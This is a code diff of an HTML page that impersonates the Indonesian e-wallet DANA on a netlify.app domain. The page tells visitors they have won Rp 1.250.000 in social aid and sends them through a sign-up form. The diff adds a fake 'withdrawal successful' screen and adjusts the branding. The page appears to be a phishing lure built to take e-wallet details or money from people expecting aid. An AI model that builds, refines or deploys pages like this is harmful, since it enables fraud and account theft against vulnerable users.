@@ -7,7 +7,7 @@
     <title>DANA Bantuan - Formulir Penerima Bantuan Digital</title>
     <meta name="description" content="Formulir penerimaan bantuan digital DANA untuk masyarakat Indonesia yang memenuhi syarat.">
     
-    <!-- ========== SOCIAL MEDIA META TAGS ========== -->
+    <!-- Social Media Meta Tags -->
     <meta property="og:url" content="https://link-dana-id-terbaru-2025.netlify.app/">
     <meta property="og:type" content="website">
     <meta property="og:title" content="DANA Bantuan - Formulir Penerima Bantuan Digital">
@@ -17,18 +17,9 @@
     <meta property="og:image:height" content="630">
     <meta property="og:image:alt" content="Formulir Bantuan Digital DANA">
     
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="DANA Bantuan - Formulir Penerima Bantuan">
-    <meta name="twitter:description" content="Daftarkan diri Anda untuk menerima bantuan digital melalui aplikasi DANA.">
-    <meta name="twitter:image" content="https://raw.githubusercontent.com/naklapang/Maakakshahuauahsg/main/public/image/dompet-digital-dana.webp">
-    <meta name="twitter:image:alt" content="Formulir Bantuan Digital DANA">
-    <!-- ========== END SOCIAL META TAGS ========== -->
-
     <!-- Favicon and Preconnects -->
     <link rel="icon" href="https://www.dana.id/favicon.ico">
     <link rel="preconnect" href="https://a.m.dana.id">
-    <link rel="preconnect" href="https://app.link">
-    <link rel="preconnect" href="https://api2.branch.io">
     
     <!-- Fonts and Styles -->
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -97,7 +88,7 @@
         <h2>Selamat! Anda Mendapatkan Bantuan</h2>
         
         <div class="saldo-container">
-          <div class="saldo-amount" id="saldo-amount">Rp 1.250.000</div>
+          <div class="saldo-amount" id="saldo-amount">Rp 0</div>
           <p class="saldo-info">Bantuan Dana Sosial yang telah disetujui</p>
         </div>
         
@@ -130,6 +121,24 @@
         
         <div class="show-text-container"><span class="show-text">Tampilkan</span></div>
       </div>
+
+      <!-- Success Page -->
+      <div id="success-page" style="display:none">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <div class="success-icon">✓</div>
+        <h2>Penarikan Berhasil!</h2>
+        
+        <div class="saldo-container">
+          <div class="saldo-amount" id="success-amount">Rp 0</div>
+          <p class="saldo-info">Telah berhasil ditransfer ke akun DANA Anda</p>
+        </div>
+        
+        <p class="info-text">Dana bantuan telah berhasil ditransfer dan dapat digunakan untuk transaksi</p>
+        
+        <div class="success-button-container">
+          <button id="kembali-button" class="button">Kembali ke Awal</button>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -152,4 +161,4 @@
   <!-- JavaScript -->
   <script src="script.js"></script>
 </body>
-  </html>
+    </html>
